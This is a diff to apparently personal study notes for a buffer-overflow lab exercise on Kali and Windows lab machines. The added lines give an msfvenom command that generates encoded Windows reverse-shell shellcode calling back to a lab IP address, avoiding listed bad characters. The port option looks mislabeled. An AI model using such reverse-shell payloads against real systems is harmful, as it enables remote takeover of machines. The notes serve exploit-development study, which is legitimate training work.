@@ -314,9 +314,12 @@ Stepping into this command sends us to the "D" placeholder, signifying a success
 _(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_
 
 1.  Update your PoC to include a working payload.
-In order to generate shellcode we will be using 
+In order to generate shellcode we will be using MSFVenom, the following command can be used to generate our shellcode. Note the bad characters discovered earlier which the encoder will avoid using.
+`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.233 PORT=9000 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
 
 ![[Pasted image 20220713215416.png]]
+
+The shellcode has now been generated.
 
 2.  Attempt to execute your exploit without using a NOP sled and observe the decoder corrupting the stack.
 
